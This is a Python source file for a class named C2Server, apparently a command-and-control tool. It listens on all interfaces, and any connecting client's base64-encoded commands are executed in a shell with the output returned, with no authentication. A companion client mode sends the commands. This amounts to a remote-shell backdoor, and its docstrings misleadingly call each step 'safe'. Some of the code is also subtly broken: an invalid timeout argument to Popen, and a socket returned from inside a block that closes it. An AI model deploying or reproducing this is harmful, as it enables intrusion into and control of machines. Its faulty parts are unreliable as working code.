import socket
import base64
import subprocess
import threading
import time
import sys

class C2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.target = "127.0.0.1"
        self.port = 7706
        self.hostname = socket.gethostname()
        self.running = True
        self.server_socket = None

    def safe_bind(self, host, port):
        """Safely bind socket with full error handling"""
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            test_sock.bind((host, port))
            test_sock.close()
            return True
        except OSError as e:
            if "10049" in str(e):
                print(f"❌ ERROR: Invalid address '{host}' for binding")
                print("   → Use '0.0.0.0' (all interfaces) or valid local IP")
            else:
                print(f"❌ ERROR: Cannot bind {host}:{port} - {e}")
            return False
        except Exception as e:
            print(f"❌ ERROR: Bind failed - {e}")
            return False

    def listen(self):
        """Safe server startup"""
        if not self.safe_bind(self.host, self.port):
            raise Exception(f"Cannot bind to {self.host}:{self.port}")
            
        try:
            print(f"[*] Starting C2 server on {self.host}:{self.port}")
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            return self.server_socket
        except Exception as e:
            print(f"❌ FATAL: Listen failed - {e}")
            raise

    def send(self):
        """Safe client connection"""
        try:
            print(f"[*] Connecting to {self.target}:{self.port}...")
            
            # Test connectivity first
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            result = test_sock.connect_ex((self.target, self.port))
            test_sock.close()
            
            if result != 0:
                raise Exception(f"Server not listening on {self.target}:{self.port}")
            
            # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # s.settimeout(5)
            with socket.create_connection((self.target, self.port)) as s:
                s.send(f"ALIVE:{self.hostname}".encode())
                time.sleep(0.2)
                print("[+] Connected successfully!")
                return s
            
        except socket.timeout:
            raise Exception(f"Connection timeout - is server running on {self.target}:{self.port}?")
        except ConnectionRefusedError:
            raise Exception(f"Connection refused - start server first on {self.target}:{self.port}")
        except Exception as e:
            raise Exception(f"Connection failed - {e}")

    def receiver(self, server_socket):
        """Main server loop with full error recovery"""
        print(f"[+] Server listening on {self.host}:{self.port}")
        print("   💡 Type 'shutdown' in client or Ctrl+C to stop")
        
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                print(f"\n[+] ✅ CONNECTION: {addr[0]}:{addr[1]}")
                
                # Safe initial handshake
                try:
                    client_socket.settimeout(5)
                    data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                    if data.startswith("ALIVE:"):
                        hostname = data.split(":", 1)[1]
                        print(f"[+] 🎯 Session: {hostname}")
                except:
                    print(f"[+] 🔗 Client connected")
                
                # Client handler
                client_thread = threading.Thread(
                    target=self._handle_client_safely,
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except KeyboardInterrupt:
                print("\n[*] 👋 Keyboard stop - shutting down...")
                self.shutdown()
                break
            except Exception as e:
                if self.running:
                    print(f"⚠️  Accept warning: {e}")
        
        print("[*] 🛑 Server stopped cleanly")
        server_socket.close()

    def _handle_client_safely(self, client_socket, addr):
        """Safe client session handler"""
        session_id = f"{addr[0]}:{addr[1]}"
        
        try:
            while self.running:
                try:
                    client_socket.send(b"> ")
                    client_socket.settimeout(30)
                    cmd_data = client_socket.recv(4096)
                    
                    if not cmd_data:
                        print(f"[*] 👋 {session_id} disconnected")
                        break
                    
                    cmd = base64.b64decode(cmd_data, validate=False).decode('utf-8', errors='ignore').strip()
                    print(f"[*] 💻 {session_id} > {cmd}")
                    
                    if cmd.lower() in ['exit', 'quit', 'stop']:
                        print(f"[*] 👋 {session_id} exit")
                        break
                    elif cmd.lower() == 'shutdown':
                        print("[*] 💥 Server shutdown requested")
                        self.shutdown()
                        break
                    
                    result = self._execute_command(cmd)
                    client_socket.send(base64.b64encode(result.encode('utf-8', errors='ignore')))
                    
                except:
                    break
                    
        except Exception as e:
            print(f"⚠️  Client {session_id}: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def _execute_command(self, cmd):
        """Safe command execution"""
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                text=True, timeout=20
            )
            stdout, stderr = proc.communicate()
            
            output = f"RC:{proc.returncode}\n\n"
            if stdout: output += stdout
            if stderr: output += f"\nERR:\n{stderr}"
            
            return output.strip() or "OK"
            
        except Exception:
            return "ERROR: Command failed"

    def sender(self, client_socket):
        """Safe client interactive mode"""
        print("[+] 💬 Connected! (exit/shutdown/stop)")
        
        try:
            while True:
                try:
                    cmd = input(f"{self.hostname}> ").strip()
                    if not cmd or cmd.lower() in ['exit', 'quit']:
                        client_socket.send(base64.b64encode(b'exit'))
                        break
                    elif cmd.lower() in ['shutdown', 'stop']:
                        client_socket.send(base64.b64encode(cmd.encode()))
                        break
                    
                    client_socket.send(base64.b64encode(cmd.encode()))
                    client_socket.settimeout(30)
                    data = client_socket.recv(8192)
                    
                    if data:
                        print(base64.b64decode(data).decode(errors='ignore'))
                        
                except KeyboardInterrupt:
                    break
                except:
                    print("⚠️  Server disconnected")
                    break
                    
        except Exception as e:
            print(f"❌ Client error: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass

    def shutdown(self):
        """Graceful shutdown"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass